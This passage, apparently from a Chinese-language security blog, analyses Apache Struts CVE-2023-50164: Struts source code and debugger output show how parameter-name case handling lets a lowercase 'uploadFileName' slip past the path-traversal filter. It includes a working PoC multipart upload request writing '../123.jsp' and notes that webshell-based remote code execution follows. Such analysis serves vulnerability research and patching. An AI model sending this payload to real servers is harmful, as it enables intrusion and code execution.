&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (method &lt;span style="color:#f92672">==&lt;/span> OgnlRuntime.&lt;span style="color:#a6e22e">ClassPropertyMethodCache&lt;/span>.&lt;span style="color:#a6e22e">NULL_REPLACEMENT&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (method &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> method;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> method &lt;span style="color:#f92672">=&lt;/span> _getSetMethod(context, targetClass, propertyName);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cacheSetMethod.&lt;span style="color:#a6e22e">put&lt;/span>(targetClass, propertyName, method);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> method;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 参数&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">arg$3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> is not available
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context &lt;span style="color:#f92672">=&lt;/span> {OgnlContext&lt;span style="color:#a6e22e">@6991&lt;/span>} size &lt;span style="color:#f92672">=&lt;/span> 7
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>targetClass &lt;span style="color:#f92672">=&lt;/span> {Class&lt;span style="color:#a6e22e">@6029&lt;/span>} &lt;span style="color:#e6db74">&amp;#34;class org.chestnut.action.UploadAction&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>propertyName &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Upload&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>method &lt;span style="color:#f92672">=&lt;/span> {Method&lt;span style="color:#a6e22e">@6987&lt;/span>} &lt;span style="color:#e6db74">&amp;#34;public void org.chestnut.action.UploadAction.setUpload(java.io.File)&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>_getSetMethod&lt;/code>方法中会调用&lt;code>getDeclaredMethods&lt;/code>方法获取目标class中定义的指定方法，目标方法通过&lt;code>propertyName&lt;/code>指定，&lt;code>getDeclaredMethods&lt;/code>会调用&lt;code>collectAccessors&lt;/code>方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> Method &lt;span style="color:#a6e22e">_getSetMethod&lt;/span>(OgnlContext context, Class targetClass, String propertyName) &lt;span style="color:#66d9ef">throws&lt;/span> IntrospectionException, OgnlException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Method result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List methods &lt;span style="color:#f92672">=&lt;/span> getDeclaredMethods(targetClass, propertyName, &lt;span style="color:#66d9ef">true&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> List &lt;span style="color:#a6e22e">getDeclaredMethods&lt;/span>(Class targetClass, String propertyName, &lt;span style="color:#66d9ef">boolean&lt;/span> findSets) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ClassCache cache &lt;span style="color:#f92672">=&lt;/span> _declaredMethods&lt;span style="color:#f92672">[&lt;/span>findSets &lt;span style="color:#f92672">?&lt;/span> 0 : 1&lt;span style="color:#f92672">]&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Map propertyCache &lt;span style="color:#f92672">=&lt;/span> (Map)cache.&lt;span style="color:#a6e22e">get&lt;/span>(targetClass);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (propertyCache &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">||&lt;/span> (result &lt;span style="color:#f92672">=&lt;/span> (List)propertyCache.&lt;span style="color:#a6e22e">get&lt;/span>(propertyName)) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">synchronized&lt;/span>(cache) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Map propertyCache &lt;span style="color:#f92672">=&lt;/span> (Map)cache.&lt;span style="color:#a6e22e">get&lt;/span>(targetClass);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (propertyCache &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">||&lt;/span> (result &lt;span style="color:#f92672">=&lt;/span> (List)((Map)propertyCache).&lt;span style="color:#a6e22e">get&lt;/span>(propertyName)) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String baseName &lt;span style="color:#f92672">=&lt;/span> capitalizeBeanPropertyName(propertyName);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> collectAccessors(targetClass, baseName, result, findSets);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result &lt;span style="color:#f92672">==&lt;/span> NotFoundList &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> : result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>collectAccessors&lt;/code>方法中首先通过反射获取到目标class的所有方法，而后遍历所有方法，并传入&lt;code>addIfAccessor&lt;/code>方法中。
&lt;code>addIfAccessor&lt;/code>会首先判断传入的方法名是否以目标名字结尾，通过判断后会通过拼接get/set/is来判断是否是目标方法，由于传入的findSets是true，所以会找到setMethodName方法最终得到setUpload方法
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/3.png" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">collectAccessors&lt;/span>(Class c, String baseName, List result, &lt;span style="color:#66d9ef">boolean&lt;/span> findSets) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Method&lt;span style="color:#f92672">[]&lt;/span> methods;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> methods &lt;span style="color:#f92672">=&lt;/span> c.&lt;span style="color:#a6e22e">getDeclaredMethods&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (SecurityException var10) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> methods &lt;span style="color:#f92672">=&lt;/span> c.&lt;span style="color:#a6e22e">getMethods&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> methods.&lt;span style="color:#a6e22e">length&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (c.&lt;span style="color:#a6e22e">isInterface&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (isDefaultMethod(methods&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>) &lt;span style="color:#f92672">||&lt;/span> isNonDefaultPublicInterfaceMethod(methods&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> addIfAccessor(result, methods&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>, baseName, findSets);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (isMethodCallable(methods&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> addIfAccessor(result, methods&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>, baseName, findSets);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Class superclass &lt;span style="color:#f92672">=&lt;/span> c.&lt;span style="color:#a6e22e">getSuperclass&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (superclass &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> collectAccessors(superclass, baseName, result, findSets);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Class&lt;span style="color:#f92672">[]&lt;/span> var6 &lt;span style="color:#f92672">=&lt;/span> c.&lt;span style="color:#a6e22e">getInterfaces&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> var7 &lt;span style="color:#f92672">=&lt;/span> var6.&lt;span style="color:#a6e22e">length&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> var8 &lt;span style="color:#f92672">=&lt;/span> 0; var8 &lt;span style="color:#f92672">&amp;lt;&lt;/span> var7; &lt;span style="color:#f92672">++&lt;/span>var8) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Class iface &lt;span style="color:#f92672">=&lt;/span> var6&lt;span style="color:#f92672">[&lt;/span>var8&lt;span style="color:#f92672">]&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> collectAccessors(iface, baseName, result, findSets);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">addIfAccessor&lt;/span>(List result, Method method, String baseName, &lt;span style="color:#66d9ef">boolean&lt;/span> findSets) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String ms &lt;span style="color:#f92672">=&lt;/span> method.&lt;span style="color:#a6e22e">getName&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (ms.&lt;span style="color:#a6e22e">endsWith&lt;/span>(baseName)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">boolean&lt;/span> isSet &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">boolean&lt;/span> isIs &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ((isSet &lt;span style="color:#f92672">=&lt;/span> ms.&lt;span style="color:#a6e22e">startsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;set&amp;#34;&lt;/span>)) &lt;span style="color:#f92672">||&lt;/span> ms.&lt;span style="color:#a6e22e">startsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;get&amp;#34;&lt;/span>) &lt;span style="color:#f92672">||&lt;/span> (isIs &lt;span style="color:#f92672">=&lt;/span> ms.&lt;span style="color:#a6e22e">startsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;is&amp;#34;&lt;/span>))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> prefixLength &lt;span style="color:#f92672">=&lt;/span> isIs &lt;span style="color:#f92672">?&lt;/span> 2 : 3;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (isSet &lt;span style="color:#f92672">==&lt;/span> findSets &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> baseName.&lt;span style="color:#a6e22e">length&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> ms.&lt;span style="color:#a6e22e">length&lt;/span>() &lt;span style="color:#f92672">-&lt;/span> prefixLength) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result.&lt;span style="color:#a6e22e">add&lt;/span>(method);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>getSetMethod&lt;/code>获取到方法后，会通过&lt;code>cacheSetMethod.put(targetClass, propertyName, method);&lt;/code>保存到缓存内。
而后再次调用时，可以获取到&lt;code>setUpload&lt;/code>方法最终通过&lt;code>invokeMethod&lt;/code>方法调用。
而对于恶意参数&lt;code>uploadFileName&lt;/code>，由于缓存中没有&lt;code>uploadFileName&lt;/code>，所以会尝试通过&lt;code>_getSetMethod&lt;/code>获取对应的set方法。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/12.png" />&lt;/p>
&lt;p>这里碰到了一个坑，众所周知Action中方法名为&lt;code>setUploadFileName&lt;/code>对应于endwith &lt;code>UploadFileName&lt;/code>，而uploadFileName 显然不满足条件，按道理在&lt;code>addIfAccessor&lt;/code>方法中应该获取不到对应的set方法才是，反常的是其反而获取到了，在重新调试，才发现在&lt;code>getDeclaredMethods&lt;/code>调用&lt;code>collectAccessors&lt;/code>方法之前，传入的baseName参数已经变成了&lt;code>UploadFileName&lt;/code>，满足前面的条件，获取到了get方法。
很明显，&lt;code>baseName&lt;/code>由&lt;code>capitalizeBeanPropertyName&lt;/code>方法返回得到&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/13.png" />&lt;/p>
&lt;p>查看&lt;code>capitalizeBeanPropertyName&lt;/code>方法，传入的&lt;code>propertyName&lt;/code>为&lt;code>uploadFileName&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> String &lt;span style="color:#a6e22e">capitalizeBeanPropertyName&lt;/span>(String propertyName) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (propertyName.&lt;span style="color:#a6e22e">length&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> 1) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> propertyName.&lt;span style="color:#a6e22e">toUpperCase&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (propertyName.&lt;span style="color:#a6e22e">startsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;get&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> propertyName.&lt;span style="color:#a6e22e">endsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;()&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> Character.&lt;span style="color:#a6e22e">isUpperCase&lt;/span>(propertyName.&lt;span style="color:#a6e22e">substring&lt;/span>(3, 4).&lt;span style="color:#a6e22e">charAt&lt;/span>(0))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> propertyName;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (propertyName.&lt;span style="color:#a6e22e">startsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;set&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> propertyName.&lt;span style="color:#a6e22e">endsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;)&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> Character.&lt;span style="color:#a6e22e">isUpperCase&lt;/span>(propertyName.&lt;span style="color:#a6e22e">substring&lt;/span>(3, 4).&lt;span style="color:#a6e22e">charAt&lt;/span>(0))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> propertyName;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (propertyName.&lt;span style="color:#a6e22e">startsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;is&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> propertyName.&lt;span style="color:#a6e22e">endsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;()&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> Character.&lt;span style="color:#a6e22e">isUpperCase&lt;/span>(propertyName.&lt;span style="color:#a6e22e">substring&lt;/span>(2, 3).&lt;span style="color:#a6e22e">charAt&lt;/span>(0))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> propertyName;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> first &lt;span style="color:#f92672">=&lt;/span> propertyName.&lt;span style="color:#a6e22e">charAt&lt;/span>(0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> second &lt;span style="color:#f92672">=&lt;/span> propertyName.&lt;span style="color:#a6e22e">charAt&lt;/span>(1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (Character.&lt;span style="color:#a6e22e">isLowerCase&lt;/span>(first) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> Character.&lt;span style="color:#a6e22e">isUpperCase&lt;/span>(second)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> propertyName;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> chars &lt;span style="color:#f92672">=&lt;/span> propertyName.&lt;span style="color:#a6e22e">toCharArray&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> chars&lt;span style="color:#f92672">[&lt;/span>0&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> Character.&lt;span style="color:#a6e22e">toUpperCase&lt;/span>(chars&lt;span style="color:#f92672">[&lt;/span>0&lt;span style="color:#f92672">]&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> String(chars);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>忽略前面的if，在最后一个else中，如果第一个字符是小写，第二个字符是大写则会直接返回，否则会将第一个字符变为大写，所以&lt;code>uploadFileName&lt;/code>在经过处理后会变为&lt;code>UploadFileName&lt;/code>，所以在后面可以通过&lt;code>addIfAccessor&lt;/code>里面的判断，获取到&lt;code>setUploadFileName&lt;/code>方法。&lt;/p>
&lt;p>也就是说会调用两次&lt;code>setUploadFileName&lt;/code>方法，而Map中大写的key排在小写的key前面，所以首先会获取到经过目录穿越过滤器过滤的的正确的UploadFileName并通过&lt;code>setUploadFileName&lt;/code>方法设置到action中的&lt;code>UploadFileName&lt;/code>属性中
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/14.png" />&lt;/p>
&lt;p>而后会设置uploadFileName的参数，而该参数不会经过目录穿越过滤器，也就是这个属性可以通过&lt;code>../&lt;/code>进行目录穿越，而后再次调用 &lt;code>setUploadFileName&lt;/code>方法action中的UploadFileName属性中，完成了变量覆盖。&lt;/p>
&lt;p>PoC&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /upload.action &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">*/*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Disposition: form-data; name=&amp;#34;Upload&amp;#34;; filename=&amp;#34;1.txt&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: text/plain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1aaa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Disposition: form-data; name=&amp;#34;uploadFileName&amp;#34;;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: text/plain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>../123.jsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="小结">小结&lt;/h3>
&lt;p>这个漏洞巧妙地利用了struts中对属性的规范化和Map存储顺序，利用参数绑定巧妙地绕过了目录穿越的过滤，成功进行变量覆盖，从而进行目录穿越，可以利用目录穿越在敏感目录写入webshell，达成远程代码执行。&lt;/p>
&lt;p>而在补丁中在使用appendAll之前会调用remove方法，remove方法会忽略大小写，如果存在相同的参数则移除之前，所以当使用小写方式尝试利用时，在appendAll方法内会先移除存在的uploadFileName项，从而避免了后续的变量覆盖。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/15.png" />&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-%28-S2-066-CVE-2023-50164%29" target="_blank">https://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/" target="_blank">https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/&lt;/a>&lt;/p>
&lt;/blockquote>
